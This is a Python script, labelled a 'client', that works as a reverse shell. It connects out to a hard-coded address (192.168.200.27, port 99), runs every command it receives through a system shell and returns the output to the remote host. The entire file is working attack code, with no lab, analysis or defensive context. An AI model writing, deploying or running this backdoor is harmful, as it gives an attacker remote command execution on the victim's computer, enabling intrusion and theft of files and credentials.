import socket
import os
import subprocess

# Constants
TARGET_HOST = "192.168.200.27"  # Server IP
TARGET_PORT = 99

def change_directory(path):
    """Change directory and return a response message."""
    try:
        os.chdir(path)
        return f"Changed directory to {os.getcwd()}"
    except FileNotFoundError as e:
        return f"Directory not found: {e}"
    except PermissionError as e:
        return f"Permission denied: {e}"
    except Exception as e:
        return f"Error changing directory: {e}"

def execute_command(command):
    """Execute a system command and return its output."""
    try:
        print(f"Executing command: {command}")  # Debug: Print command
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read()
        error_bytes = cmd.stderr.read()
        output_str = output_bytes.decode("utf-8") + error_bytes.decode("utf-8")
        return output_str
    except Exception as e:
        return f"Error executing command: {e}"

def main():
    # Set default directory to user's home directory
    home_directory = os.path.expanduser("~")
    change_directory(home_directory)
    
    try:
        # Client setup
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((TARGET_HOST, TARGET_PORT))

        while True:
            try:
                data = client.recv(1024)
                if not data:
                    print("Connection closed by the server.")
                    break

                command = data.decode("utf-8").strip()
                if command.lower() == 'exit':  # Exit command to close the client
                    print("Exit command received. Closing connection.")
                    break

                print(f"Received command: {command}")  # Debug: Print received command

                if command.startswith('cd '):
                    response = change_directory(command[3:])
                else:
                    response = execute_command(command)

                client.send((response + str(os.getcwd()) + '$').encode())
                print(f"Command output: {response}")  # Debug: Print command output

            except ConnectionResetError:
                print("Connection lost")
                break
            except Exception as e:
                print(f"An unexpected error occurred while processing the command: {e}")

    except Exception as e:
        print(f"An error occurred in the client: {e}")
    finally:
        client.close()
        print("Client connection closed")

if __name__ == "__main__":
    main()
